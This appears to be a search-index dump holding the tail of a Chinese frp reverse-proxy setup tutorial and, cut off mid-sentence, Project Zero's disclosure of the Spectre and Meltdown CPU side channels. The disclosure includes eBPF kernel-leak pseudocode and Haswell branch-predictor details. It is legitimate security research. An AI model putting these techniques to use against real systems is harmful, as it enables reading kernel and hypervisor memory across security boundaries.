\u521b\u5efa\u53ef\u6267\u884c\u6587\u4ef6\u7684\u8f6f\u8fde\u63a5\uff1a ln -s /usr/local/frp/frps /usr/bin/frps \u6216 ln -s /usr/local/frp/frpc /usr/bin/frpc \u4e0b\u9762\u914d\u7f6e\u4ee5\u5355\u4eba\u4f7f\u7528\u4e3a\u4f8b\uff0c\u5982\u679c\u9700\u8981\u914d\u7f6e\u591a\u4eba\u4f7f\u7528\uff0c\u8bf7\u81ea\u884c\u67e5\u770b \u5b98\u65b9\u6587\u6863 \u8fdb\u884c\u4fee\u6539\u3002 \u914d\u7f6e\u670d\u52a1\u7aef \u6253\u5f00\u914d\u7f6e\u6587\u4ef6\uff1afrps.ini bind_port = 7000 \u662f frps \u7684\u7aef\u53e3\uff0c\u53ef\u4ee5\u6539\uff0c\u4e5f\u53ef\u4ee5\u7528\u9ed8\u8ba4\u7684\u3002 \u6dfb\u52a0\u4e00\u4e2a\u914d\u7f6e\u9879\uff1a token \uff0c\u8fd9\u4e2a\u7528\u6765\u505a\u8eab\u4efd\u9a8c\u8bc1\uff0c\u63a8\u8350\u5f00\u542f\u3002\u53ea\u6709 frps \u548c frpc \u4e00\u81f4\u624d\u53ef\u4ee5\u5efa\u7acb\u8fde\u63a5\uff0c\u6ce8\u610f\uff0c\u5b83\u4eec\u4e4b\u95f4\u65f6\u95f4\u5dee\u4e0d\u80fd\u8d85\u8fc7 15 \u5206\u949f\uff0c\u53ef\u4ee5\u901a\u8fc7\u6dfb\u52a0 authentication_timeout \u914d\u7f6e\u9879\u6765\u66f4\u6539\u8fd9\u4e2a\u65f6\u95f4\uff0c\u5355\u4f4d\u4e3a\u79d2\uff0c\u9ed8\u8ba4\u4e3a 900\u3002\u5982\u679c\u4f60\u4f7f\u7528\u7684\u662f\u56fd\u5916 VPS \u7684\u8bdd\uff0c\u9700\u8981\u6ce8\u610f\u8fd9\u4e00\u70b9\u3002 \u5982\u679c\u6709\u9700\u8981\u7684\u8bdd\uff0c\u6dfb\u52a0 log_file \u914d\u7f6e\u9879\u4fdd\u5b58\u65e5\u5fd7\uff0c\u6bd4\u5982\uff1a log_file = /var/log/frps.log \uff0c\u6ce8\u610f\uff0c\u6dfb\u52a0\u6b64\u9879\u540e\uff0c\u8fd0\u884c frp \u4e0d\u4f1a\u8f93\u51fa\u4efb\u4f55\u4fe1\u606f\u3002 \u6dfb\u52a0 vhost_http_port \u548c vhost_https_port \u914d\u7f6e\u9879\uff0c\u8bbe\u7f6e\u5ba2\u6237\u7aef\u7684\u8f6c\u53d1\u534f\u8bae\u4e3a HTTP \u6216 HTTPS \u65f6\u7684\u8bbf\u95ee\u7aef\u53e3\u3002 \u793a\u4f8b\u914d\u7f6e\u6587\u4ef6\uff1a https://cdn.mivm.cn/www.mivm.cn/archives/openwrt-frp/frps.ini \u914d\u7f6e\u5ba2\u6237\u7aef \u6253\u5f00\u914d\u7f6e\u6587\u4ef6\uff1afrpc.ini server_addr \u548c server_port \u662f frps \u7684 IP \u548c\u7aef\u53e3\u3002 \u4e0b\u9762\u9ed8\u8ba4\u6709\u4e00\u4e2a SSH \u914d\u7f6e\uff0c\u628a\u5b83\u5220\u4e86\u3002 \u5982\u679c\u4f60\u5728 frps \u8bbe\u7f6e\u4e86 token \uff0c\u90a3 frpc \u4e5f\u9700\u8981\u540c\u6837\u7684\u914d\u7f6e\u9879\u3002 \u5982\u679c\u6709\u9700\u8981\u7684\u8bdd\uff0c\u6dfb\u52a0 log_file \u914d\u7f6e\u9879\u4fdd\u5b58\u65e5\u5fd7\uff0c\u6bd4\u5982\uff1a log_file = /var/log/frpc.log \uff0c\u6ce8\u610f\uff0c\u6dfb\u52a0\u6b64\u9879\u540e\uff0c\u8fd0\u884c frp \u5c06\u4e0d\u4f1a\u6709\u4efb\u4f55\u8f93\u51fa\u4fe1\u606f\u3002 \u53ef\u4ee5\u6dfb\u52a0 login_fail_exit \u914d\u7f6e\u9879\u51b3\u5b9a\u662f\u5426\u8ba9 fprc \u8fde\u63a5 frps \u5931\u8d25\u540e\u9000\u51fa\u7a0b\u5e8f\uff0c\u63a8\u8350\u8bbe\u7f6e\u4e3a false \uff0c\u9632\u6b62\u5f02\u5e38\u9000\u51fa\u3002 \u6dfb\u52a0\u4e00\u4e2a\u914d\u7f6e\u8282\u70b9\uff1a [web] \u6dfb\u52a0 type \u914d\u7f6e\u9879\uff0c\u8bbe\u7f6e\u8f6c\u53d1\u534f\u8bae\uff0c\u652f\u6301\uff1ahttp\u3001https\u3001tcp\u3001udp \u7b49\uff0c\u8f6c\u53d1 Web \u4f7f\u7528 HTTP(S)\uff0c\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 TCP\u3002 \u6dfb\u52a0 local_ip \u548c local_port \u8bbe\u7f6e\u672c\u5730 IP \u548c\u7aef\u53e3\uff0cIP \u8bbe\u7f6e\u4e3a 127.0.0.1\uff0c\u7aef\u53e3\u8bbe\u7f6e\u4e3a\u4f60\u8981\u8f6c\u53d1\u7684\u7aef\u53e3\u5373\u53ef\uff0cWeb \u4e00\u822c\u4e3a 80 \u548c 443 (HTTPS) \u53ef\u4ee5\u6dfb\u52a0 custom_domains \u8bbe\u7f6e\u81ea\u5b9a\u4e49\u57df\u540d\uff0c\u5982\u679c\u914d\u7f6e\u4e86\u591a\u4e2a Web \u670d\u52a1\uff0c\u53ef\u4ee5\u7528\u4e0d\u540c\u7684\u57df\u540d\u6765\u8bbf\u95ee\u3002 \u53ef\u4ee5\u6dfb\u52a0 use_encryption = true \u548c use_compression = true \u52a0\u5bc6\u548c\u538b\u7f29\u6570\u636e\uff0c\u4f46\u4f1a\u6d88\u8017\u989d\u5916\u7684 CPU \u8d44\u6e90\u3002 \u53ef\u4ee5\u6dfb\u52a0 http_user \u548c http_pwd \u6765\u4fdd\u62a4 Web \u670d\u52a1\uff0c\u4ec5\u652f\u6301 HTTP\u3002 \u5982\u679c\u4f60\u9700\u8981\u8f6c\u53d1 TCP \u548c UDP\uff0c\u53ea\u9700\u8981\u5728\u914d\u7f6e\u8282\u70b9\u91cc\u6dfb\u52a0 remote_port \u914d\u7f6e\u9879\uff0c\u8bbe\u7f6e\u8fdc\u7a0b\u7aef\u53e3\u5373\u53ef\u3002\u6bd4\u5982\u8f6c\u53d1 SSH\uff0c remote_port \u8bbe\u7f6e\u4e3a 222\uff0c\u90a3\u4e48\u53ea\u9700\u8981\u8bbf\u95ee ssh://\u8fdc\u7a0bIP:222 \u5c31\u53ef\u4ee5\u4e86\u3002 \u793a\u4f8b\u914d\u7f6e\u6587\u4ef6\uff1a https://cdn.mivm.cn/www.mivm.cn/archives/openwrt-frp/frpc.ini \u4f60\u53ef\u4ee5\u76f4\u63a5\u5728\u6211\u7684\u793a\u4f8b\u914d\u7f6e\u6587\u4ef6\u57fa\u7840\u4e0a\u8fdb\u884c\u4fee\u6539\u3002 \u66f4\u591a\u914d\u7f6e\u53c2\u6570\u53ef\u4ee5\u53c2\u8003 \u5b98\u65b9\u6587\u6863 \u914d\u7f6e\u6587\u4ef6\u4fee\u6539\u5b8c\u6210\u540e\uff0c\u540c\u6837\u4e0a\u4f20\u5230\u4f60\u7684\u516c\u7f51\u8bbe\u5907\u548c\u8def\u7531\u5668\u7684 frp \u76ee\u5f55\u3002 \u4e00\u5207\u914d\u7f6e\u5b8c\u6210\u540e\uff0c\u5148\u5728\u524d\u7aef\u8fd0\u884c\u6d4b\u8bd5\u4e00\u4e0b\u3002 \u670d\u52a1\u7aef\uff1a frps -c /usr/local/frp/frps.ini \u5ba2\u6237\u7aef\uff1a frpc -c /usr/local/frp/frpc.ini \u5982\u679c\u63d0\u793a\u547d\u4ee4\u4e0d\u5b58\u5728\uff0c\u8bf7\u68c0\u67e5\u4f60\u7684\u8f6f\u8fde\u63a5\u662f\u5426\u521b\u5efa\u6709\u8bef\u3002 \u52a1\u5fc5\u5148\u8fd0\u884c\u670d\u52a1\u7aef\u518d\u8fd0\u884c\u5ba2\u6237\u7aef\uff0c\u5426\u5219\u5ba2\u6237\u7aef\u4f1a\u81ea\u52a8\u9000\u51fa\u3002 \u8fd0\u884c\u6210\u529f\u540e\u8bbf\u95ee\u6d4b\u8bd5\u4e00\u4e0b\uff0c\u6ca1\u95ee\u9898\u7684\u8bdd\uff0c\u5c31\u53ef\u4ee5\u653e\u5728\u540e\u53f0\u8fd0\u884c\u4e86\u3002 \u540e\u53f0\u8fd0\u884c \u7b2c\u4e00\u79cd\uff1a \u8fd0\u884c\uff1a frpc -c /usr/local/frp/frpc.ini >/dev/null 2>&1 & \u7ed3\u675f\uff1a killall frpc \u5f00\u673a\u8fd0\u884c\uff1a sed -i '/exit 0/i\\sleep 10 && frpc -c /usr/local/frp/frpc.ini >/dev/null 2>&1 &' /etc/rc.local \u53d6\u6d88\u5f00\u673a\u8fd0\u884c\uff1a sed -i '/sleep 10 && frpc -c \\/usr\\/local\\/frp\\/frpc.ini >\\/dev\\/null 2>&1 &/d' /etc/rc.local \u4e0d\u8fc7\u8fd9\u79cd\u65b9\u6cd5\u540e\u53f0\u8fd0\u884c frp\uff0c\u597d\u50cf\u7279\u522b\u5bb9\u6613\u6302\u6389\u3002 \u4f7f\u7528\u8fd9\u79cd\u65b9\u6cd5\u63a8\u8350\u5f00\u542f\u65e5\u5fd7\u4fdd\u5b58 \u7b2c\u4e8c\u79cd\uff1a\u4f7f\u7528 screen \u8def\u7531\u5668\u5b89\u88c5\u547d\u4ee4\uff1a opkg update && opkg install screen \uff0c\u670d\u52a1\u5668\u5b89\u88c5\u547d\u4ee4\uff1a sudo apt-get install screen -y \u6216 sudo yum install screen -y \u3002 screen \u7684\u8be6\u7ec6\u7528\u6cd5\u5927\u5bb6\u53ef\u4ee5\u53bb\u767e\u5ea6\u4e00\u4e0b\uff0c\u6211\u8fd9\u91cc\u53ea\u8bf4\u600e\u4e48\u7528\u5b83\u6765\u540e\u53f0\u8fd0\u884c frp\u3002 \u8fd0\u884c\uff1a screen -dmS frpc frpc -c /usr/local/frp/frpc.ini \u67e5\u770b\u8fd0\u884c\u72b6\u6001\uff1a screen -r frpc \u67e5\u770b\u8fd0\u884c\u72b6\u6001\u540e\uff0c\u6309 Ctrl + C \u7ed3\u675f frpc\uff0c\u6309 Ctrl + A + D (A \u548c D \u4f9d\u6b21\u6309\u4e0b) \u4e3a\u6682\u65f6\u9000\u51fa\uff0c\u4f9d\u7136\u4fdd\u6301\u540e\u53f0\u8fd0\u884c\u3002 \u5f00\u673a\u8fd0\u884c\uff1a sed -i '/exit 0/i\\sleep 10 && screen -dmS frpc frpc -c /usr/local/frp/frpc.ini' /etc/rc.local \u53d6\u6d88\u5f00\u673a\u8fd0\u884c\uff1a sed -i '/sleep 10 && screen -dmS frpc frpc -c \\/usr\\/local\\/frp\\/frpc.ini/d' /etc/rc.local \u5f00\u673a\u5ef6\u8fdf 10 \u79d2\u8fd0\u884c\u662f\u786e\u4fdd\u8def\u7531\u5668\u8054\u7f51\uff0c\u907f\u514d frpc \u81ea\u52a8\u9000\u51fa\u3002 \u7b2c\u4e09\u79cd\uff08\u4ec5\u9002\u7528\u4e8e\u6709 systemd \u7684 Linux \u53d1\u884c\u7248\uff09\uff1a \u4e0b\u8f7d\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u5bf9\u5e94\u7684 systemd \u670d\u52a1\u6587\u4ef6\uff0c\u91cc\u9762\u7684\u8def\u5f84\u662f\u9ed8\u8ba4\u7684 /usr/local/frp/ \uff0c\u5982\u679c\u4f60\u7684\u8def\u5f84\u4e0d\u662f\u8fd9\u4e2a\uff0c\u6ce8\u610f\u66f4\u6539\u3002 \u670d\u52a1\u7aef\uff1a sudo wget https://cdn.mivm.cn/www.mivm.cn/archives/openwrt-frp/frps.service -O /lib/systemd/system/frps.service \u5ba2\u6237\u7aef\uff1a sudo wget https://cdn.mivm.cn/www.mivm.cn/archives/openwrt-frp/frps.service -O /lib/systemd/system/frps.service \u5f00\u673a\u542f\u52a8 frp\uff1a systemctl enable frpc.service \u6216 systemctl enable frps.service \u542f\u52a8 frp\uff1a systemctl start frpc.service \u6216 systemctl start frps.service \u505c\u6b62 frp\uff1a systemctl stop frpc.service \u6216 systemctl stop frps.service \u91cd\u542f frp\uff1a systemctl restart frpc.service \u6216 systemctl restart frps.service \u67e5\u770b systemd \u670d\u52a1\u72b6\u6001\uff1a systemctl status frpc.service \u6216 systemctl status frps.service \u5982\u679c\u63d0\u793a running \u5219\u8868\u793a\u8fd0\u884c\u6b63\u5e38 \u5982\u679c\u4f60\u60f3\u8fdc\u7a0b\u7535\u8111\uff0c\u53ef\u4ee5\u5728\u7535\u8111\u4e0a\u5b89\u88c5 TeamViewer \uff0c\u7136\u540e\u5f00\u542f\u4e3b\u677f BIOS \u91cc\u7684 PCI \u8bbe\u5907\u5524\u9192\uff0c\u8def\u7531\u5668\u5b89\u88c5 WOL \u7f51\u7edc\u5524\u9192\uff0c\u8fd9\u6837\u4f60\u5c31\u53ef\u4ee5\u8fdc\u7a0b\u5f00\u673a\uff0c\u5e76\u4e14\u4f7f\u7528 TeamViewer \u63a7\u5236\u7535\u8111\u3002 \u5f53\u7136\uff0c\u4f60\u4e5f\u53ef\u4ee5\u8f6c\u53d1\u5185\u7f51\u5185\u5176\u4ed6\u8bbe\u5907\u7684\u670d\u52a1\uff0c\u5c06 frpc \u7684 local_ip \u914d\u7f6e\u9879\u6539\u4e3a\u5185\u7f51\u5176\u4ed6\u8bbe\u5907\u7684 IP \u5373\u53ef\u3002 GitHub: https://github.com/fatedier/frp \u5fae\u4fe1\u626b\u63cf\u4e8c\u7ef4\u7801\u5173\u6ce8\u6211\u4eec \u5982\u679c\u89c9\u5f97\u6587\u7ae0\u6709\u5e2e\u52a9\u5230\u4f60\uff0c\u53ef\u4ee5\u70b9\u51fb\u4e0b\u65b9\u7684\u6253\u8d4f\u6309\u94ae\u8d5e\u52a9\u4e0b\u670d\u52a1\u5668\u8d39\u7528\u3002 \u539f\u6587\u94fe\u63a5\uff1a https://www.mivm.cn/openwrt-frp/","title":"\u642d\u5efa\u5185\u7f51\u7a7f\u900f"},{"location":"RPI/Reading%20privileged%20memory%20with%20a%20side-channel/","text":"Reading privileged memory with a side-channel Posted by Jann Horn, Project Zero We have discovered that CPU data cache timing can be abused to efficiently leak information out of mis-speculated execution, leading to (at worst) arbitrary virtual memory read vulnerabilities across local security boundaries in various contexts. Variants of this issue are known to affect many modern processors, including certain processors by Intel, AMD and ARM. For a few Intel and AMD CPU models, we have exploits that work against real software. We reported this issue to Intel, AMD and ARM on 2017-06-01 [1]. So far, there are three known variants of the issue: Variant 1: bounds check bypass (CVE-2017-5753) Variant 2: branch target injection (CVE-2017-5715) Variant 3: rogue data cache load (CVE-2017-5754) Before the issues described here were publicly disclosed, Daniel Gruss, Moritz Lipp, Yuval Yarom, Paul Kocher, Daniel Genkin, Michael Schwarz, Mike Hamburg, Stefan Mangard, Thomas Prescher and Werner Haas also reported them; their [writeups/blogposts/paper drafts] are at: Spectre (variants 1 and 2) Meltdown (variant 3) During the course of our research, we developed the following proofs of concept (PoCs): A PoC that demonstrates the basic principles behind variant 1 in userspace on the tested Intel Haswell Xeon CPU, the AMD FX CPU, the AMD PRO CPU and an ARM Cortex A57 [2]. This PoC only tests for the ability to read data inside mis-speculated execution within the same process, without crossing any privilege boundaries. A PoC for variant 1 that, when running with normal user privileges under a modern Linux kernel with a distro-standard config, can perform arbitrary reads in a 4GiB range [3] in kernel virtual memory on the Intel Haswell Xeon CPU. If the kernel's BPF JIT is enabled (non-default configuration), it also works on the AMD PRO CPU. On the Intel Haswell Xeon CPU, kernel virtual memory can be read at a rate of around 2000 bytes per second after around 4 seconds of startup time. [4] A PoC for variant 2 that, when running with root privileges inside a KVM guest created using virt-manager on the Intel Haswell Xeon CPU, with a specific (now outdated) version of Debian's distro kernel [5] running on the host, can read host kernel memory at a rate of around 1500 bytes/second, with room for optimization. Before the attack can be performed, some initialization has to be performed that takes roughly between 10 and 30 minutes for a machine with 64GiB of RAM; the needed time should scale roughly linearly with the amount of host RAM. (If 2MB hugepages are available to the guest, the initialization should be much faster, but that hasn't been tested.) A PoC for variant 3 that, when running with normal user privileges, can read kernel memory on the Intel Haswell Xeon CPU under some precondition. We believe that this precondition is that the targeted kernel memory is present in the L1D cache. For interesting resources around this topic, look down into the \"Literature\" section. A warning regarding explanations about processor internals in this blogpost: This blogpost contains a lot of speculation about hardware internals based on observed behavior, which might not necessarily correspond to what processors are actually doing. We have some ideas on possible mitigations and provided some of those ideas to the processor vendors; however, we believe that the processor vendors are in a much better position than we are to design and evaluate mitigations, and we expect them to be the source of authoritative guidance. The PoC code and the writeups that we sent to the CPU vendors are available here: https://bugs.chromium.org/p/project-zero/issues/detail?id=1272 . Tested Processors Intel(R) Xeon(R) CPU E5-1650 v3 @ 3.50GHz (called \"Intel Haswell Xeon CPU\" in the rest of this document) AMD FX(tm)-8320 Eight-Core Processor (called \"AMD FX CPU\" in the rest of this document) AMD PRO A8-9600 R7, 10 COMPUTE CORES 4C+6G (called \"AMD PRO CPU\" in the rest of this document) An ARM Cortex A57 core of a Google Nexus 5x phone [6] (called \"ARM Cortex A57\" in the rest of this document) Glossary retire: An instruction retires when its results, e.g. register writes and memory writes, are committed and made visible to the rest of the system. Instructions can be executed out of order, but must always retire in order. logical processor core: A logical processor core is what the operating system sees as a processor core. With hyperthreading enabled, the number of logical cores is a multiple of the number of physical cores. cached/uncached data: In this blogpost, \"uncached\" data is data that is only present in main memory, not in any of the cache levels of the CPU. Loading uncached data will typically take over 100 cycles of CPU time. speculative execution: A processor can execute past a branch without knowing whether it will be taken or where its target is, therefore executing instructions before it is known whether they should be executed. If this speculation turns out to have been incorrect, the CPU can discard the resulting state without architectural effects and continue execution on the correct execution path. Instructions do not retire before it is known that they are on the correct execution path. mis-speculation window: The time window during which the CPU speculatively executes the wrong code and has not yet detected that mis-speculation has occurred. Variant 1: Bounds check bypass This section explains the common theory behind all three variants and the theory behind our PoC for variant 1 that, when running in userspace under a Debian distro kernel, can perform arbitrary reads in a 4GiB region of kernel memory in at least the following configurations: Intel Haswell Xeon CPU, eBPF JIT is off (default state) Intel Haswell Xeon CPU, eBPF JIT is on (non-default state) AMD PRO CPU, eBPF JIT is on (non-default state) The state of the eBPF JIT can be toggled using the net.core.bpf_jit_enable sysctl. Theoretical explanation The Intel Optimization Reference Manual says the following regarding Sandy Bridge (and later microarchitectural revisions) in section 2.3.2.3 (\"Branch Prediction\"): Branch prediction predicts the branch target and enables the processor to begin executing instructions long before the branch true execution path is known. In section 2.3.5.2 (\"L1 DCache\"): Loads can: [...] * Be carried out speculatively, before preceding branches are resolved. * Take cache misses out of order and in an overlapped manner. Intel's Software Developer's Manual [7] states in Volume 3A, section 11.7 (\"Implicit Caching (Pentium 4, Intel Xeon, and P6 family processors\"): Implicit caching occurs when a memory element is made potentially cacheable, although the element may never have been accessed in the normal von Neumann sequence. Implicit caching occurs on the P6 and more recent processor families due to aggressive prefetching, branch prediction, and TLB miss handling. Implicit caching is an extension of the behavior of existing Intel386, Intel486, and Pentium processor systems, since software running on these processor families also has not been able to deterministically predict the behavior of instruction prefetch. Consider the code sample below. If arr1->length is uncached, the processor can speculatively load data from arr1->data[untrusted_offset_from_caller]. This is an out-of-bounds read. That should not matter because the processor will effectively roll back the execution state when the branch has executed; none of the speculatively executed instructions will retire (e.g. cause registers etc. to be affected). struct array { unsigned long length; unsigned char data[]; }; struct array *arr1 = ...; unsigned long untrusted_offset_from_caller = ...; if (untrusted_offset_from_caller < arr1->length) { unsigned char value = arr1->data[untrusted_offset_from_caller]; ... } However, in the following code sample, there's an issue. If arr1->length, arr2->data[0x200] and arr2->data[0x300] are not cached, but all other accessed data is, and the branch conditions are predicted as true, the processor can do the following speculatively before arr1->length has been loaded and the execution is re-steered: load value = arr1->data[untrusted_offset_from_caller] start a load from a data-dependent offset in arr2->data, loading the corresponding cache line into the L1 cache struct array { unsigned long length; unsigned char data[]; }; struct array arr1 = ...; / small array */ struct array arr2 = ...; / array of size 0x400 */ / >0x400 (OUT OF BOUNDS!) / unsigned long untrusted_offset_from_caller = ...; if (untrusted_offset_from_caller < arr1->length) { unsigned char value = arr1->data[untrusted_offset_from_caller]; unsigned long index2 = ((value&1)*0x100)+0x200; if (index2 < arr2->length) { unsigned char value2 = arr2->data[index2]; } } After the execution has been returned to the non-speculative path because the processor has noticed that untrusted_offset_from_caller is bigger than arr1->length, the cache line containing arr2->data[index2] stays in the L1 cache. By measuring the time required to load arr2->data[0x200] and arr2->data[0x300], an attacker can then determine whether the value of index2 during speculative execution was 0x200 or 0x300 - which discloses whether arr1->data[untrusted_offset_from_caller]&1 is 0 or 1. To be able to actually use this behavior for an attack, an attacker needs to be able to cause the execution of such a vulnerable code pattern in the targeted context with an out-of-bounds index. For this, the vulnerable code pattern must either be present in existing code, or there must be an interpreter or JIT engine that can be used to generate the vulnerable code pattern. So far, we have not actually identified any existing, exploitable instances of the vulnerable code pattern; the PoC for leaking kernel memory using variant 1 uses the eBPF interpreter or the eBPF JIT engine, which are built into the kernel and accessible to normal users. A minor variant of this could be to instead use an out-of-bounds read to a function pointer to gain control of execution in the mis-speculated path. We did not investigate this variant further. Attacking the kernel This section describes in more detail how variant 1 can be used to leak Linux kernel memory using the eBPF bytecode interpreter and JIT engine. While there are many interesting potential targets for variant 1 attacks, we chose to attack the Linux in-kernel eBPF JIT/interpreter because it provides more control to the attacker than most other JITs. The Linux kernel supports eBPF since version 3.18. Unprivileged userspace code can supply bytecode to the kernel that is verified by the kernel and then: either interpreted by an in-kernel bytecode interpreter or translated to native machine code that also runs in kernel context using a JIT engine (which translates individual bytecode instructions without performing any further optimizations) Execution of the bytecode can be triggered by attaching the eBPF bytecode to a socket as a filter and then sending data through the other end of the socket. Whether the JIT engine is enabled depends on a run-time configuration setting - but at least on the tested Intel processor, the attack works independent of that setting. Unlike classic BPF, eBPF has data types like data arrays and function pointer arrays into which eBPF bytecode can index. Therefore, it is possible to create the code pattern described above in the kernel using eBPF bytecode. eBPF's data arrays are less efficient than its function pointer arrays, so the attack will use the latter where possible. Both machines on which this was tested have no SMAP, and the PoC relies on that (but it shouldn't be a precondition in principle). Additionally, at least on the Intel machine on which this was tested, bouncing modified cache lines between cores is slow, apparently because the MESI protocol is used for cache coherence [8]. Changing the reference counter of an eBPF array on one physical CPU core causes the cache line containing the reference counter to be bounced over to that CPU core, making reads of the reference counter on all other CPU cores slow until the changed reference counter has been written back to memory. Because the length and the reference counter of an eBPF array are stored in the same cache line, this also means that changing the reference counter on one physical CPU core causes reads of the eBPF array's length to be slow on other physical CPU cores (intentional false sharing). The attack uses two eBPF programs. The first one tail-calls through a page-aligned eBPF function pointer array prog_map at a configurable index. In simplified terms, this program is used to determine the address of prog_map by guessing the offset from prog_map to a userspace address and tail-calling through prog_map at the guessed offsets. To cause the branch prediction to predict that the offset is below the length of prog_map, tail calls to an in-bounds index are performed in between. To increase the mis-speculation window, the cache line containing the length of prog_map is bounced to another core. To test whether an offset guess was successful, it can be tested whether the userspace address has been loaded into the cache. Because such straightforward brute-force guessing of the address would be slow, the following optimization is used: 215 adjacent userspace memory mappings [9], each consisting of 24 pages, are created at the userspace address user_mapping_area, covering a total area of 231 bytes. Each mapping maps the same physical pages, and all mappings are present in the pagetables. This permits the attack to be carried out in steps of 231 bytes. For each step, after causing an out-of-bounds access through prog_map, only one cache line each from the first 24 pages of user_mapping_area have to be tested for cached memory. Because the L3 cache is physically indexed, any access to a virtual address mapping a physical page will cause all other virtual addresses mapping the same physical page to become cached as well. When this attack finds a hit\u2014a cached memory location\u2014the upper 33 bits of the kernel address are known (because they can be derived from the address guess at which the hit occurred), and the low 16 bits of the address are also known (from the offset inside user_mapping_area at which the hit was found). The remaining part of the address of user_mapping_area is the middle. The remaining bits in the middle can be determined by bisecting the remaining address space: Map two physical pages to adjacent ranges of virtual addresses, each virtual address range the size of half of the remaining search space, then determine the remaining address bit-wise. At this point, a second eBPF program can be used to actually leak data. In pseudocode, this program looks as follows: uint64_t bitmask = ; uint64_t bitshift_selector = ; uint64_t prog_array_base_offset = ; uint64_t secret_data_offset = ; // index will be bounds-checked by the runtime, // but the bounds check will be bypassed speculatively uint64_t secret_data = bpf_map_read(array=victim_array, index=secret_data_offset); // select a single bit, move it to a specific position, and add the base offset uint64_t progmap_index = (((secret_data & bitmask) >> bitshift_selector) << 7) + prog_array_base_offset; bpf_tail_call(prog_map, progmap_index); This program reads 8-byte-aligned 64-bit values from an eBPF data array \"victim_map\" at a runtime-configurable offset and bitmasks and bit-shifts the value so that one bit is mapped to one of two values that are 27 bytes apart (sufficient to not land in the same or adjacent cache lines when used as an array index). Finally it adds a 64-bit offset, then uses the resulting value as an offset into prog_map for a tail call. This program can then be used to leak memory by repeatedly calling the eBPF program with an out-of-bounds offset into victim_map that specifies the data to leak and an out-of-bounds offset into prog_map that causes prog_map + offset to point to a userspace memory area. Misleading the branch prediction and bouncing the cache lines works the same way as for the first eBPF program, except that now, the cache line holding the length of victim_map must also be bounced to another core. Variant 2: Branch target injection This section describes the theory behind our PoC for variant 2 that, when running with root privileges inside a KVM guest created using virt-manager on the Intel Haswell Xeon CPU, with a specific version of Debian's distro kernel running on the host, can read host kernel memory at a rate of around 1500 bytes/second. Basics Prior research (see the Literature section at the end) has shown that it is possible for code in separate security contexts to influence each other's branch prediction. So far, this has only been used to infer information about where code is located (in other words, to create interference from the victim to the attacker); however, the basic hypothesis of this attack variant is that it can also be used to redirect execution of code in the victim context (in other words, to create interference from the attacker to the victim; the other way around). The basic idea for the attack is to target victim code that contains an indirect branch whose target address is loaded from memory and flush the cache line containing the target address out to main memory. Then, when the CPU reaches the indirect branch, it won't know the true destination of the jump, and it won't be able to calculate the true destination until it has finished loading the cache line back into the CPU, which takes a few hundred cycles. Therefore, there is a time window of typically over 100 cycles in which the CPU will speculatively execute instructions based on branch prediction. Haswell branch prediction internals Some of the internals of the branch prediction implemented by Intel's processors have already been published; however, getting this attack to work properly required significant further experimentation to determine additional details. This section focuses on the branch prediction internals that were experimentally derived from the Intel Haswell Xeon CPU. Haswell seems to have multiple branch prediction mechanisms that work very differently: A generic branch predictor that can only store one target per source address; used for all kinds of jumps, like absolute jumps, relative jumps and so on. A specialized indirect call predictor that can store multiple targets per source address; used for indirect calls. (There is also a specialized return predictor, according to Intel's optimization manual, but we haven't analyzed that in detail yet. If this predictor could be used to reliably dump out some of the call stack through which a VM was entered, that would be very interesting.) Generic predictor The generic branch predictor, as documented in prior research, only uses the lower 31 bits of the address of the last byte of the source instruction for its prediction. If, for example, a branch target buffer (BTB) entry exists for a jump from 0x4141.0004.1000 to 0x4141.0004.5123, the generic predictor will also use it to predict a jump from 0x4242.0004.1000. When the higher bits of the source address differ like this, the higher bits of the predicted destination change together with it\u2014in this case, the predicted destination address will be 0x4242.0004.5123\u2014so apparently this predictor doesn't store the full, absolute destination address. Before the lower 31 bits of the source address are used to look up a BTB entry, they are folded together using XOR. Specifically, the following bits are folded together: | bit A | bit B | | 0x40.0000 | 0x2000 | | 0x80.0000 | 0x4000 | | 0x100.0000 | 0x8000 | | 0x200.0000 | 0x1.0000 | | 0x400.0000 | 0x2.0000 | | 0x800.0000 | 0x4.0000 | | 0x2000.0000 | 0x10.0000 | | 0x4000.0000 | 0x20.0000 | In other words, if a source address is XORed with both numbers in a row of this table, the branch predictor will not be able to distinguish the resulting address from the original source address when performing a lookup. For example, the branch predictor is able to distinguish source addresses 0x100.0000 and 0x180.0000, and it can also distinguish source addresses 0x100.0000 and 0x180.8000, but it can't distinguish source addresses 0x100.0000 and 0x140.2000 or source addresses 0x100.0000 and 0x180.4000. In the following, this will be referred to as aliased source addresses. When an aliased source address is used, the branch predictor will still predict the same target as for the unaliased source address. This indicates that the branch predictor stores a truncated absolute destination address, but that hasn't been verified. Based on observed maximum forward and backward jump distances for different source addresses, the low 32-bit half of the target address could be stored as an absolute 32-bit value with an additional bit that specifies whether the jump from source to target crosses a 232 boundary; if the jump crosses such a boundary, bit 31 of the source address determines whether the high half of the instruction pointer should increment or decrement. Indirect call predictor The inputs of the BTB lookup for this mechanism seem to be: The low 12 bits of the address of the source instruction (we are not sure whether it's the address of the first or the last byte) or a subset of them. The branch history buffer state. If the indirect call predictor can't resolve a branch, it is resolved by the generic predictor instead. Intel's optimization manual hints at this behavior: \"Indirect Calls and Jumps. These may either be predicted as having a monotonic target or as having targets that vary in accordance with recent program behavior.\" The branch history buffer (BHB) stores information about the last 29 taken branches - basically a fingerprint of recent control flow - and is used to allow better prediction of indirect calls that can have multiple targets. The update function of the BHB works as follows (in pseudocode; src is the address of the last byte of the source instruction, dst is the destination address): void bhb_update(uint58_t *bhb_state, unsigned long src, unsigned long dst) { *bhb_state <<= 2; *bhb_state ^= (dst & 0x3f); *bhb_state ^= (src & 0xc0) >> 6; *bhb_state ^= (src & 0xc00) >> (10 - 2); *bhb_state ^= (src & 0xc000) >> (14 - 4); *bhb_state ^= (src & 0x30) << (6 - 4); *bhb_state ^= (src & 0x300) << (8 - 8); *bhb_state ^= (src & 0x3000) >> (12 - 10); *bhb_state ^= (src & 0x30000) >> (16 - 12); *bhb_state ^= (src & 0xc0000) >> (18 - 14); } Some of the bits of the BHB state seem to be folded together further using XOR when used for a BTB access, but the precise folding function hasn't been understood yet. The BHB is interesting for two reasons. First, knowledge about its approximate behavior is required in order to be able to accurately cause collisions in the indirect call predictor. But it also permits dumping out the BHB state at any repeatable program state at which the attacker can execute code - for example, when attacking a hypervisor, directly after a hypercall. The dumped BHB state can then be used to fingerprint the hypervisor or, if the attacker has access to the hypervisor binary, to determine the low 20 bits of the hypervisor 